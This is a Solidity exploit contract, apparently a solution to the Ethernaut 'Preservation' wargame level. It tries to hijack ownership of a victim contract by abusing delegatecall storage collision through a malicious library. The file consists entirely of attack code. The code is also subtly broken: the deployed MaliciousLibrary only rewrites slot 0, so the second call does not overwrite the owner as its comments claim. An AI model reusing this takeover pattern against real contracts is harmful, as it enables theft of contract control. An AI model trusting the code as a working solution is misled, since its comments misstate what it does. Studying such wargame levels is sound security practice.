// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/Preservation/Preservation.sol";

contract PreservationExploit {
    Preservation victim;
    address attacker;

    constructor(address _victim) {
        victim = Preservation(payable(_victim));
        attacker = address(this);
    }

    function hack() public {
        // Deploy the malicious library
        MaliciousLibrary malicious = new MaliciousLibrary();

        // Set the timeZone1Library to the malicious contract's address
        victim.setFirstTime(uint(uint160(address(malicious))));

        // Call setFirstTime again, which now points to malicious contract, to set owner
        victim.setFirstTime(uint(uint160(attacker)));
    }

    // This function will be called via delegatecall and will set the owner
    function setTime(uint _time) public {
        // Overwrite the owner slot (slot 2) with attacker address
        assembly {
            sstore(2, caller())
        }
    }

    receive() external payable {}
}

contract MaliciousLibrary {
    uint public time;

    function setTime(uint _time) public {
        // This function will overwrite the owner in the Preservation contract
        // No action needed here for the first call
        time = _time;
    }
}